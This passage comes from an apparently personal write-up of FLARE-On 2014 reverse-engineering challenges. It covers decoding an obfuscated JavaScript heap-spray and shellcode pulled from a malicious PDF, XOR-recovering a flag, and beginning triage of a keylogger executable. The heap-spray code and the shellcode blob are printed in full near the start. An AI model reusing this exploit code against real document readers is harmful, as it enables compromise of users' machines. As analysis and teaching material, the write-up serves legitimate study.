<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
<span class="line-number">50</span>
<span class="line-number">51</span>
<span class="line-number">52</span>
<span class="line-number">53</span>
<span class="line-number">54</span>
<span class="line-number">55</span>
<span class="line-number">56</span>
<span class="line-number">57</span>
<span class="line-number">58</span>
<span class="line-number">59</span>
<span class="line-number">60</span>
<span class="line-number">61</span>
<span class="line-number">62</span>
<span class="line-number">63</span>
<span class="line-number">64</span>
<span class="line-number">65</span>
<span class="line-number">66</span>
<span class="line-number">67</span>
<span class="line-number">68</span>
<span class="line-number">69</span>
<span class="line-number">70</span>
<span class="line-number">71</span>
</pre></td><td class="code"><pre><code class="js"><span class="line"><span class="p">[</span><span class="mh">0x00000000</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">pdfvi</span>
</span><span class="line"><span class="nx">Applying</span> <span class="nx">Filter</span> <span class="nx">FlateDecode</span> <span class="p">...</span>
</span><span class="line"><span class="nx">Applying</span> <span class="nx">Filter</span> <span class="nx">ASCIIHexDecode</span> <span class="p">...</span>
</span><span class="line"><span class="nx">Encoded</span> <span class="nx">Stream</span> <span class="mi">1</span>
</span><span class="line"><span class="o">--------------------------------------------------------------------------------</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">HdPN</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">    <span class="c1">// important</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">IxTUQnOvHg</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&quot;%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%</span>
</span><span class="line"><span class="s2">ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9</span>
</span><span class="line"><span class="s2">ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412</span>
</span><span class="line"><span class="s2">d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%</span>
</span><span class="line"><span class="s2">u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub</span>
</span><span class="line"><span class="s2">7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7</span>
</span><span class="line"><span class="s2">e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%</span>
</span><span class="line"><span class="s2">u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4</span>
</span><span class="line"><span class="s2">190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21b</span>
</span><span class="line"><span class="s2">f%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%</span>
</span><span class="line"><span class="s2">uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u7</span>
</span><span class="line"><span class="s2">69b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb</span>
</span><span class="line"><span class="s2">0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%</span>
</span><span class="line"><span class="s2">u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4</span>
</span><span class="line"><span class="s2">879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u881</span>
</span><span class="line"><span class="s2">4%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%</span>
</span><span class="line"><span class="s2">ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7</span>
</span><span class="line"><span class="s2">b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u257</span>
</span><span class="line"><span class="s2">7%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%</span>
</span><span class="line"><span class="s2">u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u4</span>
</span><span class="line"><span class="s2">1b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u317</span>
</span><span class="line"><span class="s2">4%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%</span>
</span><span class="line"><span class="s2">ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue</span>
</span><span class="line"><span class="s2">3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b</span>
</span><span class="line"><span class="s2">9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%</span>
</span><span class="line"><span class="s2">u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u0</span>
</span><span class="line"><span class="s2">27c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033</span>
</span><span class="line"><span class="s2">c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%</span>
</span><span class="line"><span class="s2">uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8</span>
</span><span class="line"><span class="s2">b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u726</span>
</span><span class="line"><span class="s2">2%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%</span>
</span><span class="line"><span class="s2">u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2</span>
</span><span class="line"><span class="s2">c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua31</span>
</span><span class="line"><span class="s2">6%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%</span>
</span><span class="line"><span class="s2">u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u9</span>
</span><span class="line"><span class="s2">8a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81f</span>
</span><span class="line"><span class="s2">f%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%</span>
</span><span class="line"><span class="s2">u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5</span>
</span><span class="line"><span class="s2">068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff&quot;</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">    <span class="c1">// not important</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">MPBPtdcBjTlpvyTYkSwgkrWhXL</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class="line">    <span class="k">for</span> <span class="p">(</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">=</span><span class="mi">128</span><span class="p">;</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">;</span><span class="o">--</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="p">)</span> <span class="nx">MPBPtdcBjTlpvyTYkSwgkrWhXL</span><span class="o">+=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&quot;%ub32f%u3791&quot;</span><span class="p">);</span>
</span><span class="line">    <span class="nx">ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv</span> <span class="o">=</span> <span class="nx">MPBPtdcBjTlpvyTYkSwgkrWhXL</span> <span class="o">+</span> <span class="nx">IxTUQnOvHg</span><span class="p">;</span>
</span><span class="line">    <span class="nx">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&quot;%ub32f%u3791&quot;</span><span class="p">);</span>
</span><span class="line">    <span class="nx">fJWhwERSDZtaZXlhcREfhZjCCVqFAPS</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
</span><span class="line">    <span class="nx">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA</span> <span class="o">=</span> <span class="nx">fJWhwERSDZtaZXlhcREfhZjCCVqFAPS</span><span class="o">+</span><span class="nx">ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv</span><span class="p">.</span><span class="nx">length</span>
</span><span class="line">    <span class="k">while</span> <span class="p">(</span><span class="nx">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY</span><span class="p">.</span><span class="nx">length</span><span class="o">&lt;</span><span class="nx">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA</span><span class="p">)</span> <span class="nx">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHT</span><span class="o">+=</span><span class="nx">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY</span><span class="p">;</span>
</span><span class="line">    <span class="nx">UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb</span> <span class="o">=</span> <span class="nx">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA</span><span class="p">);</span>
</span><span class="line">    <span class="nx">MOysyGgYplwyZzNdETHwkru</span> <span class="o">=</span> <span class="nx">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="nx">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA</span><span class="p">);</span>
</span><span class="line">    <span class="k">while</span><span class="p">(</span><span class="nx">MOysyGgYplwyZzNdETHwkru</span><span class="p">.</span><span class="nx">length</span><span class="o">+</span><span class="nx">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA</span> <span class="o">&lt;</span> <span class="mh">0x40000</span><span class="p">)</span> <span class="nx">MOysyGgYplwyZzNdETHwkru</span> <span class="o">=</span> <span class="nx">MOysyGgYplwyZzNdETHwkru</span><span class="o">+</span><span class="nx">MOysyGgYplwyZzNdETHwkr</span><span class="o">+</span><span class="nx">UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb</span><span class="p">;</span>
</span><span class="line">    <span class="nx">DPwxazRhwbQGu</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>
</span><span class="line">    <span class="k">for</span> <span class="p">(</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">;</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">++</span><span class="p">)</span> <span class="nx">DPwxazRhwbQGu</span><span class="p">[</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="p">]</span> <span class="o">=</span> <span class="nx">MOysyGgYplwyZzNdETHwkru</span> <span class="o">+</span> <span class="nx">ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">    <span class="k">for</span> <span class="p">(</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">=</span><span class="mi">142</span><span class="p">;</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">;</span><span class="o">--</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="p">)</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span> <span class="o">+=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&quot;%ub550%u0166&quot;</span><span class="p">);</span>
</span><span class="line">    <span class="nx">bGtvKT</span> <span class="o">=</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span><span class="p">.</span><span class="nx">length</span> <span class="o">+</span> <span class="mi">20</span><span class="p">;</span>
</span><span class="line">        <span class="k">while</span> <span class="p">(</span><span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="nx">bGtvKT</span><span class="p">)</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span> <span class="o">+=</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span><span class="p">;</span>
</span><span class="line">    <span class="nx">Juphd</span> <span class="o">=</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">bGtvKT</span><span class="p">);</span>
</span><span class="line">    <span class="nx">QCZabMzxQiD</span> <span class="o">=</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="nx">bGtvKT</span><span class="p">);</span>
</span><span class="line">    <span class="k">while</span><span class="p">(</span><span class="nx">QCZabMzxQiD</span><span class="p">.</span><span class="nx">length</span><span class="o">+</span><span class="nx">bGtvKT</span> <span class="o">&lt;</span> <span class="mh">0x40000</span><span class="p">)</span> <span class="nx">QCZabMzxQiD</span> <span class="o">=</span> <span class="nx">QCZabMzxQiD</span><span class="o">+</span><span class="nx">QCZabMzxQiD</span><span class="o">+</span><span class="nx">Juphd</span><span class="p">;</span>
</span><span class="line">    <span class="nx">FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>
</span><span class="line">    <span class="k">for</span> <span class="p">(</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">&lt;</span><span class="mi">125</span><span class="p">;</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">++</span><span class="p">)</span> <span class="nx">FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE</span><span class="p">[</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="p">]</span><span class="o">=</span> <span class="nx">QCZabMzxQiD</span> <span class="o">+</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Obfuscated JavaScript. I executed it and printed the last variable, but the result was garbage. The code just does a lot of computatation. However variable <code>IxTUQnOvHg</code> looks suspicious. A large number of bytes are unescaped. After reading some guides, I found out how to decode this. <code>%u72f9</code> should be converted to <code>0xf972</code>. I wrote a simple Python program to do this decoding. Read 6 characters, discard the first two (%u), swap characters 3 and 4 with 5 and 6. The end result is some shellcode. I used this website to convert it to an executable: <a href="http://sandsprite.com/shellcode_2_exe.php">http://sandsprite.com/shellcode_2_exe.php</a>.</p>

<p>After running the executable in Immunity a message box pops up with an encoded message. If we look inside memory, we can find this string.</p>

<p><img src="http://parsiya.net/images/2014/flare/4-1.jpg" alt="MessageBox Text" title="MessageBox Text" /></p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>First string in hex </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class=""><span class="line">2574243575216B2A36366B2F3274752E2A2305316B203723256B2B2D46</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The length is close to the email (29 bytes). Here’s what I thought. If it is the email then the last 13 bytes should be <code>@flare-on.com</code>. It’s probably xor-ed with a key. If the key is smaller than 13 bytes then it is repeated and we can easily find it. How? xor is transitive. If <code>plaintext xor key = ciphertext</code> then <code>key = plaintext xor ciphertext</code>. If we xor the last 13 bytes of ciphertext with <code>@flare-on.com</code> then we will find the last 13 bytes of the key. If key is smaller than plain/ciphertext (if key is as long as plain/ciphertext then we will have a <code>one time pad</code>) it is repeated.</p>

<p>The following Python code does it. On a side note, we really need a string xor operator in Python. I wrote one which is probably not that good.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>First string xor </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">mydata</span><span class="p">,</span><span class="n">mykey</span><span class="p">):</span>
</span><span class="line">    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">mykey</span><span class="p">)</span>
</span><span class="line">    <span class="n">datalen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">mydata</span><span class="p">)</span>
</span><span class="line">
</span><span class="line">    <span class="c"># easier to just extend the key array, but probably not that efficient</span>
</span><span class="line">    <span class="c"># not that we care about it here ;)</span>
</span><span class="line">    <span class="n">key</span> <span class="o">=</span> <span class="n">mykey</span> <span class="o">*</span> <span class="p">(</span> <span class="p">(</span><span class="n">datalen</span><span class="o">/</span><span class="n">keylen</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span> <span class="p">)</span>
</span><span class="line">
</span><span class="line">    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">mydata</span><span class="p">,</span><span class="n">key</span><span class="p">))</span>
</span><span class="line">
</span><span class="line"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">hexlify</span><span class="p">,</span> <span class="n">unhexlify</span>
</span><span class="line">
</span><span class="line"><span class="c"># last 13 bytes</span>
</span><span class="line"><span class="n">ciphertext</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="s">&quot;2574243575216B2A36366B2F3274752E2A2305316B203723256B2B2D46&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">13</span><span class="p">:]</span>
</span><span class="line"><span class="n">plaintext</span> <span class="o">=</span> <span class="s">&quot;@flare-on.com&quot;</span>
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="n">xor</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span><span class="n">plaintext</span><span class="p">)</span>
</span><span class="line"><span class="k">print</span> <span class="n">hexlify</span><span class="p">(</span> <span class="n">xor</span> <span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span><span class="n">plaintext</span><span class="p">)</span> <span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="c"># result - :(</span>
</span><span class="line"><span class="c"># jEiPELKEHB+</span>
</span><span class="line"><span class="c"># 6a45695019451a4c4b4548422b</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Nope. Doesn’t look like it.</p>

<p>I usually wander around in the debugger and look at memory. Run the executable in Immunity and look around in memory after the message box pops up. A little bit further up from the original message we see more <code>OWNED!!!</code> strings (title of the message box). Right before two owneds I saw another string. This one is longer and looks more promising. Right click on it and select <code>Follow in Dump</code>. Select the string  and again right click and select <code>Copy &gt; To clipboard</code>. It’s in Unicode so <code>5</code> represented as <code>0x0035</code> instead of <code>0x35</code>.</p>

<p><img src="http://parsiya.net/images/2014/flare/4-2.jpg" alt="Interesting String" title="Interesting String" /></p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Second string in hex </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class=""><span class="line"># I did not select the first 00 before 5 (0x0035)
</span><span class="line">00143868  35 00 24 00 74 00 25 00  5.$.t.%.
</span><span class="line">00143870  2A 00 6B 00 21 00 75 00  *.k.!.u.
</span><span class="line">00143878  2F 00 6B 00 36 00 36 00  /.k.6.6.
</span><span class="line">00143880  2E 00 75 00 74 00 32 00  ..u.t.2.
</span><span class="line">00143888  31 00 05 00 23 00 2A 00  1..#.*.
</span><span class="line">00143890  23 00 37 00 20 00 6B 00  #.7. .k.
</span><span class="line">00143898  2D 00 2B 00 6B 00 25 00  -.+.k.%.
</span><span class="line">001438A0  2D 00 28                 -.(
</span><span class="line">
</span><span class="line"># or in Python-friendly format
</span><span class="line">352474252a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Let’s apply the xor-logic on this string too.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Second string xor </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c"># add xor function from last example</span>
</span><span class="line"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">hexlify</span><span class="p">,</span> <span class="n">unhexlify</span>
</span><span class="line">
</span><span class="line"><span class="c"># last 13 bytes</span>
</span><span class="line"><span class="n">ciphertext</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="s">&quot;352474252a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">13</span><span class="p">:]</span>
</span><span class="line"><span class="n">plaintext</span> <span class="o">=</span> <span class="s">&quot;@flare-on.com&quot;</span>
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="n">xor</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span><span class="n">plaintext</span><span class="p">)</span>
</span><span class="line"><span class="k">print</span> <span class="n">hexlify</span><span class="p">(</span> <span class="n">xor</span> <span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span><span class="n">plaintext</span><span class="p">)</span> <span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="c"># result :)</span>
</span><span class="line"><span class="c"># EEFBEEFBEEFBE</span>
</span><span class="line"><span class="c"># 45454642454546424545464245</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Bingo. The key is <code>BEEF</code>. It is also in the initial shellcode as a string. Let’s xor it with the complete string and get the flag.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag 4 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class=""><span class="line">wa1ch.d3m.spl01ts@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div>

<hr />

<h2 id="a-namech5a-challenge-5---5get-about-it"><a name="ch5"></a> Challenge 5 - 5get About It</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class=""><span class="line">Another one bites the dust!
</span><span class="line">Here's some more fun for you, password is the same as always.
</span><span class="line">-FLARE</span></code></pre></td></tr></table></div></figure></notextile></div>

<h3 id="be-sure-to-run-this-challenge-in-a-vm">Be sure to run this challenge in a VM.</h3>

<p>The file inside the challenge zip is named <code>5get_it</code> and is around 100KBs. A quick look with <code>HxD</code> says it’s a Portable Executable (MZ and PE magic bytes). Let’s get some help from <code>PE-Studio</code>. It has a VirusTotal score of 29/55 with most AVs calling it a generic trojan or keylogger. Click on <code>Imported Symbols</code> and look at the red symbols. Some of them are more interesting than others. To get more information about any of them, right click and select <code>Query MSDN</code> inside PE-Studio (handy, neh?).</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Interesting symbols </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class=""><span class="line">RegSetValueExA - RegCreateKeyA: Messing with registry
</span><span class="line">CreateFileW - CreateFileA - WriteFile - CopyFileA: Creating, writing to, and copying file
</span><span class="line">GetAsyncKeyState: "Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState"</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Also, let’s run <code>strings</code> on it. I used <a href="https://www.cygwin.com/">cygwin</a>. I have omitted the garbage and only kept the interesting strings:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Interesting strings </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
</pre></td><td class="code"><pre><code class=""><span class="line">$ strings.exe 5get_it
</span><span class="line">svchost.log
</span><span class="line">[SHIFT]
</span><span class="line">[RETURN]
</span><span class="line">[BACKSPACE]
</span><span class="line">[TAB]
</span><span class="line">[CTRL]
</span><span class="line">[DELETE]
</span><span class="line">[CAPS LOCK]
